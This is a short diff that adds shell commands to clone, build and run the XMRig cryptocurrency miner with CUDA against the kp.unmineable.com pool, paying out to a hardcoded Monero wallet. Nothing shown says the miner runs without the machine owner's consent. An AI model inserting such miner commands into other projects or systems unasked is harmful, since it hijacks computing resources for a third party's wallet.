@@ -1,1 +1,15 @@
 ./xmrig --cuda -o kp.unmineable.com:3333 -u 8881dN96ZHg1Y3AFaxBzsQNmjwmc21oivLyLpQJ4PoEfUe9hFo1WQAVWFAPA7VXVWPEBHHAeAcYuzStUp4dXCgji9zCcqtT -k --nicehash --coin monero -a kawpow
+
+
+
+apt install git build-essential cmake automake libtool autoconf
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/scripts
+touch ford.txt
+./build_deps.sh > ford.txt
+ cd ../build 
+touch bld.txt
+cmake .. -DXMRIG_DEPS=scripts/deps > bld.txt
+touch js.txt
+make -j$(nproc) > js.txt 
+./xmrig --cuda -o kp.unmineable.com:3333 -u 8881dN96ZHg1Y3AFaxBzsQNmjwmc21oivLyLpQJ4PoEfUe9hFo1WQAVWFAPA7VXVWPEBHHAeAcYuzStUp4dXCgji9zCcqtT -k --nicehash --coin monero -a kawpow
